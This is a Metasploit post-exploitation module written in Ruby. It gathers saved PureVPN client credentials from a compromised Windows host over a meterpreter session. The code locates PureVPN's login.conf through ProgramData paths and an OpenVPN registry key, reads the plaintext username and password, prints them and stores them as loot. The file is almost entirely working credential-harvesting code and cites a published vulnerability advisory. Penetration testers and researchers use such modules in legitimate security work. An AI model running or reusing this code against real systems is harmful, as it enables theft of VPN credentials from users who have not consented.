##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Windows Gather PureVPN Client Credential Collector',
        'Description'   => %q{
          Finds the password stored for the PureVPN Client.
        },
        'References'     =>
        [
          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Credential-Leak-Flaws-in-Windows-PureVPN-Client/'],
          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-010/?fid=11779']
        ],
        'License'       => MSF_LICENSE,
        'Author'        => ['Manuel Nader #AgoraSecurity'],
        'Platform'      => ['win'],
        'Arch'          => [ARCH_X86, ARCH_X64],
        'SessionTypes'  => ['meterpreter']
    ))

    register_options(
      # In case software is installed in a rare directory
      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])
    ])
  end

  def run
    if session.type != 'meterpreter'
      print_error ('Only meterpreter sessions are supported by this post module')
      return
    end

    locations = get_locations
    content = get_content(locations)
    if content && content !~ /^\-1\r\n$/
      get_client_creds(content)
    else
      print_status("No username/password found")
    end
  end

  def get_locations
    progfiles_env = session.sys.config.getenvs('ProgramData')
    locations = []
    progfiles_env.each do |_k, v|
      vprint_status("Searching PureVPN Client installation at #{v}")
      if session.fs.dir.entries(name = v).include? 'purevpn'
        vprint_status("Found PureVPN Client installation at #{v}")
        locations << v + '\\purevpn\\config\\'
      end
    end
    keys = [
      'HKLM\\SOFTWARE\\WOW6432Node\\OpenVPN', # 64 bit
      # 'HKLM\\SOFTWARE\\OpenVPN' # 32 bit
    ]

    if datastore['RPATH'].nil?
      locations << datastore['RPATH']
    end

    keys.each do |key|
      begin
        root_key, base_key = session.sys.registry.splitkey(key)
        value = session.sys.registry.query_value_direct(root_key, base_key, 'config_dir')
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.message)
        next
      end
      locations << value.data + '\\'
    end
    locations.compact.uniq!
    return locations
  end

  def get_content(locations)
    datfile = 'login.conf'
    locations.each do |location|
      vprint_status("Checking for login configuration at: #{location}")
      begin
        files = session.fs.dir.entries(location)
        files.map{|i| i.downcase}.uniq
        if files.include?(datfile)
          filepath = location + datfile
          print_status("Configuration file found: #{filepath}")
          print_status("Found PureVPN login configuration on #{sysinfo['Computer']} via session ID: #{session.sid}")
          data = session.fs.file.open(filepath)
          return data.read
        end
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.message)
        next
      end
    end

    nil
  end

  def parse_file(data)
    username, password = data.split("\r\n")
    creds  = {'username' => username, 'password' => password}
    print_good('Collected the following credentials:')
    print_good("    Username: #{username}")
    print_good("    Password: #{password}")

    creds
  end

  def report_cred(creds)
    # report the goods!
    loot_path = store_loot('PureVPN.creds', 'text/xml', session, creds.to_xml,
      'purevpn_credentials.xml', 'PureVPN Credentials')
    print_status("PureVPN credentials saved in: #{loot_path}")
  end

  def get_client_creds(data)
    credentials = Rex::Text::Table.new(
      'Header'    => 'PureVPN Client Credentials',
      'Indent'    => 1,
      'Columns'   =>
      [
        'Username',
        'Password'
      ])
    result = parse_file(data)
    report_cred(result)
  end
end
